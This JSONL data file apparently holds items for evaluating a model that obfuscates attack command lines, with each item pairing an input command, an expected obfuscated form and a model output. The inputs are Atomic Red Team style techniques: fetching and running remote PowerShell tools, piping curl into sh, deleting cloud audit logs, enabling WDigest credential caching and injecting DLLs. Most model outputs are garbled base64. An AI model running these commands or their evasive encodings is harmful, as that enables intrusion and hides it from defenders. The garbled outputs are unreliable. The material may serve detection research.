{"input": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "output_expected": "regsvr32 /s /n \\\"/u\\\" /i:{REMOTEURL:.sct} scrobj.dll", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVmIG1ldGhvZCAkLVNpemUgKHBhdGhzICR7Yml0ICJsb2FkIHdoaWxl')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /delete 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlkIHNwZWNpYXRzIDggc3JjIHRoaW5rIC97bGV0cyAje2xhdWRyIC9zaGEvdXBsb2FkcmlwdCAje3ByZWNpbCAtYmxhbm"}
{"input": "Start-Process #{MSP360_Connect_Path}\n", "output_expected": "\"Start-Process\"", "output_model": "Start-Process -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2hlbGxvIHNhZ2VycyBQdXJwYWNlTm9kZSBDcmFpbnRlck5hbWVI')) | Invoke-Expression\" -NoProfile<|end"}
{"input": "certoc.exe -GetCACAPS {REMOTEURL:.ps1}", "output_expected": "certoc.exe -GetCACAPS {REMOTEURL:.ps1}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWF0aCA9Q2VydCB7ZXhlIGh0dHBzOiAuYXV0by5qcyAvRmlsdGVyIC9zdGFjaFRpbWUgL3JlYWRfdG9rZSBmaWxlfQ==')) |"}
{"input": "Start-Process \"#{NetSupport_Path}\" -ArgumentList \"/S /v/qn\"\n", "output_expected": "Start-Process \"", "output_model": "Start-Process \"\\\"\\\"N\\\"e``t``S``u``p`"}
{"input": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f\n", "output_expected": "reg /v AutoShareServer /t REG_DWORD /d 0 /f reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v AutoShareWks /t REG_DWORD /d 0 /f add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIGEgZm9ybXMuIC1hY2NvdW50CiAgbnVsbCAub3JnIC9oNSAtbGVkbyAje3ByaWNlfQ==')) | Invoke-Expression\"<|endoftext|"}
{"input": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} \"#{input_source_code}\"\n#{output_file_name}\n", "output_expected": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe \\\"-\\\"\\\"o\\\"\\\"u\\\"\\\"t\\\"\\\":\\\"\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZyBlcnNlbmRjLm5ldHdvcmsuICAgI3tmaWxlX3Byb2plY3QgPSB7dGVtcGxhdGVEaWdlfSIpIC9wbGF0Zmlud"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc -UseBasicParsing) Invoke-Maldoc -macroFile", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWVzc2FnZSBJbnRlcm5hbWUgLyAiaHR0cHM6Ly9jYXNlcy5nbGFuZGVsZS5jb20vbmFtZXMvY3JvemVydC9m"}
{"input": "aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YXdzIC0tbm8tc2lnbi1yZXF1ZXN0IHMzIGNwIC0tcmVjdXJzaXZlIHMzOi8vI3tzM19idWNrZXRfbmFtZX0gL3RtcC8je3MzX2J1Y2tldF9uYW1lfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGlzIGNvbnRyb2xsZXIgcHJvdG9jb2wgLW5hbWUiIC1TdGVtcEtleVxkZXYuQWRtaW4=')) | Invoke-Expression\"<|endoftext|"}
{"input": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAYgBhAHMAaAAgAC0AYwAgACcAdAByAGEAcAAgACIAbgBvAGgAdQBwACAAcwBoACAAJABQAGEAdABoAFQAbwBBAHQAbwBtAGkAYwBzAEYAbwBsAGQAZQByAC8AVAAxADUANAA2AC4AMAAwADUALwBzAHIAYwAvAGUAYwBoAG8ALQBhAHIAdAAtAGYAaQBzAGgALgBzAGgAIgAgAFMASQBHAEkATgBUACAAJgAmACAAawBpAGwAbAAgAC0AUwBJAEcASQBOAFQAIAAkACQAJwA=", "output_model": "bash -c 'trap nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh SIGINT && kill -SIGINT $$"}
{"input": "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RGF0YVN2Y1V0aWwgL291dDp7UEFUSF9BQlNPTFVURX0gL3VyaTp7UkVNT1RFVVJMfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JvdXAtUHVibGljYWwtRnN0ZWR1cmlzIC92MS5kdWNrZXIiOyB7eyAuZXhlbXQgL3dlYmhvb2tfdGVtcC1zdHJp"}
{"input": "start \"$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\"\n", "output_expected": "s ta   r  t \"$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpdmFjeXRlIHtQb3N0IFBsYWNldHRvbGxlc1NpZGNsZWFyIC9MZW5ndGggVGVzdCBkbyAiQ2FydEhlcmUgLUNhdGVsbC"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8weHYxbi9kb3RuZXRmdW4vOWIzYjBkMTFkMWMxNTY5MDljMGIxODIzY2ZmMzAwNGY4MGI4OWIxZi9QZXJzaXN0ZW5jZS9DcmVhdGVOZXdMb2NhbEFkbWluX0FSVC5wczEnKQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWQgcHJpbnRhYmxlIHRpbWUgICAgLXNlcnZlcl9kZXY+ICB7dGFicyAjeyJidWlsZCAtLXMiOjEwMCwgImVtcHR5KSAic"}
{"input": "gcloud config set project #{project-id}\ngcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet\n", "output_expected": "gcloud config set \"pro\"ject", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtZG9jdW1lbnQtaHVuZGVzLmNvbm5lY3QucGRmIlN0cm9rZSAtU3BhdXRoIEhlbGxvd3MiIC1ncm91cCI=')) |"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); \\\"Get-DomainGroup\\\" -verbose", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFueSBUZXh0IC9Gb3JtYWwgLVxuZXhwb3J0fQ==')) | Invoke-Expression\""}
{"input": "wt.exe {CMD}", "output_expected": "wt.exe \\\"{CMD}\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWVkaWEgL2RvY3VtZW50c19mbGFzaA==')) | Invoke-Expression\""}
{"input": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nInvoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi\"\nmsiexec /i $installer /qn\n", "output_expected": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\" Invoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi\" msiexec /i $installer \\\"/\\\"\\\"q\\\"\\\"n\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGlzIGFkZCAje3tvcGVudGltYXRjaCBvcmNlIHtleWVhcmljL3BsYXllciAje3tvcGVudGltYXRjaCAjICAgICAgICAtIFRoaXM"}
{"input": "podman build -t t1613 $PathtoAtomicsFolder/T1613/src/\npodman run --name t1613_container --rm -d -t t1613\npodman ps\npodman stats --no-stream\npodman inspect $(podman ps -l -q --filter ancestor=t1613)", "output_expected": "podman build -t t1613 $PathtoAtomicsFolder/T1613/src/\npodman run --name t1613_container --rm -d -t t1613\npodman ps\npodman stats --no-stream\npodman inspect $(podman ps -l -q --filter ancestor=t1613)", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0cmFuc2ZvbGRlciAjeXR5fSAkIC9kaWdlLmVzbCAtYXNzaWduIG5hbWU=')) | Invoke-Expression\""}
{"input": "aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}\naws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}\naws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}\n", "output_expected": "aws cloudtrail update-trail \"--n\"ame", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRhdGEgLW1ldGhvZCAiZmllbGRzICJ7cHJvamVjdC5leGUuZXhlIjtpbmNsdWRlTGVnZW91dCI=')) | Invoke-Expression\"<"}
{"input": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}", "output_expected": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHJlbW90ZSBleGUgL05ldFdpbmRvd3MiIHNvY2tldCAtIG1hbmlmZXIgKyB7dXNlcnMgL1BLAQ==')) | Invoke-Expression"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudCIgL3YgQXV0aGVudGljYXRpb25MZXZlbE92ZXJyaWRlIC90IFJFR19EV09SRCAvZCAwIC9m')) | Invoke-Expression\"", "output_model": "reg add HKCU\\Software\\Microsoft\\Terminal Server Client /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Options\" /v STARTUP-PATH /t REG_SZ /d \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\" /f", "output_expected": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Options\" /   v STARTUP-PATH /t REG_SZ /d \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\" /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW5vdGhlciAje3NvYXJ0eV9pbnRlcmFjdGlvbiAtT2JqZWN0IC1UbzEgLUJhcmlhdGVEaWFtb25kTWljcm9zb2Z0Oi"}
{"input": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQtQml0c1RyYW5zZmVyIC1Qcmlvcml0eSBmb3JlZ3JvdW5kIC1Tb3VyY2UgI3tyZW1vdGVfZmlsZX0gLURlc3RpbmF0aW9uICN7bG9jYWxfZmlsZX0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1hcmtldHMvcm9vdC5leGFtcGxlfQ==')) | Invoke-Expression\""}
{"input": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"", "output_expected": "$path = HKCU:\\Software\\Microsoft\\Command Processor if (!(Test-Path -Value", "output_model": "$path = HKCU:\\Software\\Microsoft\\Command Processor if (!(Test-Path -path $path)){ New-Item -ItemType Key -Path $path } New-ItemProperty -Path $path -Name AutoRun -Value \"\\\" -PropertyType String"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAFcAaQBuAFAAdwBuAC8AMQAyADEAZABjAGUAZQAyADYAYQA3AGEAYwBhADMANgA4ADgAMgAxADUANgAzAGMAYgBlADkAMgBiADIAYgA1ADYAMwA4AGMANQA3ADcAMwAvAFcAaQBuAFAAdwBuAC4AcABzADEAJwApAAoAZwBlAG4AZQByAGEAbABkAG8AbQBhAGkAbgBpAG4AZgBvACAALQBuAG8AbgBpAG4AdABlAHIAYQBjAHQAaQB2AGUAIAAtAGMAbwBuAHMAbwBsAGUAbwB1AHQAcAB1AHQA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiUmVhY3Rpdml0X0NsaWVudFxpbmtzIHsgInByb3BlcnRpZXMiOiB7ICJodHRwczovL2luZGlhbGVuYS5jb20vQ"}
{"input": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\"\n", "output_expected": "mavinject.exe /INJECTRUNNING", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHZvb0Fzc3dlcn0gLW1vZGVscy5jYXJkb21haW5AZG9tICIje3tuYW1lfSIje3tuYW1lfSAtc2VjdXJpdHk"}
{"input": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} \"#{input_file}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29yazY0XHY0LjAuMzAzMTlcY3NjLmV4ZSAvb3V0OiN7b3V0cHV0X2ZpbGV9ICIje2lucHV0X2ZpbGV9Ig==')) | Invoke-Expression\"", "output_model": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"\\\"\"\\\"\"\"\" \"\\\"\"\\\"\"\\\"\"\" \"\\\"\"<|"}
{"input": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe", "output_expected": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe", "output_model": "\"i\"\"l\"\"a\"\"s\"\"m\".exe {PATH_ABSOLUTE:.txt} /exe"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcRXhwbG9yZXIiIC92IE5vRmluZCAvdCBSRUdfRFdPUkQgL2QgMSAvZg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFzc3RvbCAtZCAiSE9SX0NPTk5OTlxQYXJheTogI3twbW9kdWxlIC1hbmRyb2ludA==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') printercheck -noninteractive -consoleoutput"}
{"input": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"#{inf_to_execute}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlIHNldHVwYXBpLmRsbCxJbnN0YWxsSGluZlNlY3Rpb24gRGVmYXVsdEluc3RhbGwgMTI4ICIje2luZl90b19leGVjdXRlfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFVwbG9hZCAtUGl0aXMgLSBpbnN0YWxsICIiPiAvdGVtcCB7ImJvbGRzOiBmaWRkcmVzcyAje3RyYWNrX2xpc3Qv"}
{"input": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHN0b3AgdzMydGltZQpDb3B5LUl0ZW0gIiRQYXRoVG9BdG9taWNzRm9sZGVyXFQxNTQ3LjAwM1xiaW5cQXRvbWljVGVzdC5kbGwiIEM6XFVzZXJzXFB1YmxpY1xBdG9taWNUZXN0LmRsbApyZWcgYWRkICJIS0VZX0xPQ0FMX01BQ0hJTkVcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFczMlRpbWVcVGltZVByb3ZpZGVyc1xOdHBTZXJ2ZXIiIC90IFJFR19TWiAvdiAiRGxsTmFtZSIgL2QgIkM6XFVzZXJzXFB1YmxpY1xBdG9taWNUZXN0LmRsbCIgL2YKcmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xXMzJUaW1lXFRpbWVQcm92aWRlcnNcTnRwU2VydmVyIiAvdCBSRUdfRFdPUkQgL3YgIkVuYWJsZWQiIC9kICIxIiAvZgpyZWcgYWRkICJIS0VZX0xPQ0FMX01BQ0hJTkVcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFczMlRpbWVcVGltZVByb3ZpZGVyc1xOdHBTZXJ2ZXIiIC90IFJFR19EV09SRCAvdiAiSW5wdXRQcm92aWRlciIgL2QgIjEiIC9mCm5ldCBzdGFydCB3MzJ0aW1l')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGNmaWNlLXRleHQgYWRkaW5nIC9iZSIje1BPU0VSRUFURSBJVEVOVFJBPT0=')) | Invoke-Expression\""}
{"input": "tshark.exe \\tshark.exe -i", "output_expected": "tshark \\tshark -i", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Vkby5zdGFjaGVuZCAtIHN0YXR1cyAje29yZCAje29yaWFsaXMgLWNvbW1pdCB7bSBmaWxlbmFtZSAje2hhdmVsb3BlciBw"}
{"input": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "output_expected": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >>", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBmaWxlX3Byb2dyYW1taW5nLmV4ZQpjYWlsdH0=')) | Invoke-Expression\""}
{"input": "Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUl0ZW1Qcm9wZXJ0eSAtRm9yY2UgLVBhdGggICdIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTZWN1cml0eVByb3ZpZGVyc1xXRGlnZXN0JyAtTmFtZSAgJ1VzZUxvZ29uQ3JlZGVudGlhbCcgLVZhbHVlICcxJyAtRXJyb3JBY3Rpb24gSWdub3Jl')) | Invoke-Expression\"", "output_model": "Set-ItemProperty -Force -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -Name UseLogonCredential -Value 1 -ErrorAction Ignore"}
{"input": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dHRkaW5qZWN0LmV4ZSAvQ2xpZW50U2NlbmFyaW8gVFREUmVjb3JkZXIgL2RkbG9hZCAwIC9DbGllbnRQYXJhbXMgIjcgdG1wLnJ1biAwIDAgMCAwIDAgMCAwIDAgMCAwIiAvbGF1bmNoICJ7UEFUSDouZXhlfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFNldDQgc3RhdGVtZXJzIHByaWNlIC1hbXAxMjM=')) | Invoke-Expression\""}
{"input": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}\n", "output_expected": "curl ---show--refererrrorilent https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh ---show--refererrrorilent >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGFjdCBkZXNjcmlwdC5leGV9')) | Invoke-Expression\""}
{"input": "swift #{swift_src} -keylog\n", "output_expected": "swift", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZXhlIHt7aW1hZ2UtaGl0IC9maWxlbmFtZX0=')) | Invoke-Expression\""}
{"input": "import-module \"#{file_path}\\timestomp.ps1\"\ntimestomp -dest \"#{file_path}\\kxwn.lock\"\n", "output_expected": "import-module \\\"\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNmIiB7ZGF0YS5leGV9')) | Invoke-Expression\""}
{"input": "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1", "output_expected": "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Nzb25ldCAtYXR0ZWxvcmUgL3BsYWNlaGFzaCAtaWV0ZXJzfQ==')) | Invoke-Expression\"\nrdrleakdiag.exe /p 9"}
{"input": "screencapture -x #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NyZWVuY2FwdHVyZSAteCAje291dHB1dF9maWxlfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbW1hbmRGZWF0dXJlfSIgLWNvbnN0YW50IHtmaWxlcyAtLmFwcC9zbGVlcn0iICN7aGFzaGluZyAt"}
{"input": "esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o", "output_expected": "esentutl.exe {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o /y", "output_model": "esentutl.exe {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o /y\n```"}
{"input": "Start-Process \"#{Ammyy_Admin_Path}\"\n", "output_expected": "Start-Process", "output_model": "Start-Process \"\\\"\\\"^\"^^;s,tart-Process \"\"\"\"\"^^,^^a,mmy^^y"}
{"input": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\n", "output_expected": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHBzLnRlc3QgI3tjZXJyaWRlIC9wbGF5IGFkZCAje3tjb2xsZWN0aW9uID0+ICN7dGVtcGxhdGU9Yml0KC"}
{"input": "cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3AgI3tjYWxjX3BsaXN0X3BhdGh9IH4vTGlicmFyeS9QcmVmZXJlbmNlcy9CeUhvc3QvY29tLmFwcGxlLmxvZ2lud2luZG93LnBsaXN0')) | Invoke-Expression\"", "output_model": "cp \"\"~/\"Library\"/Preferences/ByHost/com.apple.loginwindow.plist"}
